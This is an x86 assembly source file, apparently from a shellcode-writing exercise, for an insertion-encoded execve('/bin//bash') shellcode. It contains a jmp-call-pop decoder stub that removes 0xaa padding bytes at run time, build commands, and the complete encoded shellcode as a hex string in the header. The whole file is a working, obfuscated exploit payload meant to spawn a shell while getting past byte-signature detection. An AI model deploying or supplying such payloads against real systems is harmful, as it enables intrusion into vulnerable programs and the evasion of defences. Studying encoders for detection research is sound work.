; InsertionExecveBashStack.asm
; by Abatchy
;
;   nasm -felf32 InsertionExecveBashStack.asm && ld -o InsertionExecveBashStack InsertionExecveBashStack.o
; Generated shellcode: "\xeb\x16\x5e\x8d\x7e\x01\x31\xc0\x8a\x4c\x47\x01\x88\x4c\x06\x01\x40\x80\xe9\xbb\x74\x07\xeb\xf0\xe8\xe5\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x62\xaa\x61\xaa\x73\xaa\x68\xaa\x68\xaa\x62\xaa\x69\xaa\x6e\xaa\x2f\xaa\x68\xaa\x2f\xaa\x2f\xaa\x2f\xaa\x2f\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb"


global _start

section .text

_start:
    
    jmp short get_shellcode_addr
ReturnLabel:
    pop esi
    lea edi, [esi + 1]

    xor eax, eax

decode:
    mov cl, byte [edi + eax * 2 + 1]
    mov byte [esi + eax + 1], cl
    inc eax
    sub cl, 0xbb        ; Added 0xbbbb at the end so we can terminate the loop by setting the ZF
    jz shellcode
    jmp short decode

get_shellcode_addr:
    call ReturnLabel
    shellcode: db 0x31, 0xaa, 0xc0, 0xaa, 0x50, 0xaa, 0x68, 0xaa, 0x62, 0xaa, 0x61, 0xaa, 0x73, 0xaa, 0x68, 0xaa, 0x68, 0xaa, 0x62, 0xaa, 0x69, 0xaa, 0x6e, 0xaa, 0x2f, 0xaa, 0x68, 0xaa, 0x2f, 0xaa, 0x2f, 0xaa, 0x2f, 0xaa, 0x2f, 0xaa, 0x89, 0xaa, 0xe3, 0xaa, 0x50, 0xaa, 0x89, 0xaa, 0xe2, 0xaa, 0x53, 0xaa, 0x89, 0xaa, 0xe1, 0xaa, 0xb0, 0xaa, 0x0b, 0xaa, 0xcd, 0xaa, 0x80, 0xaa, 0xbb, 0xbb
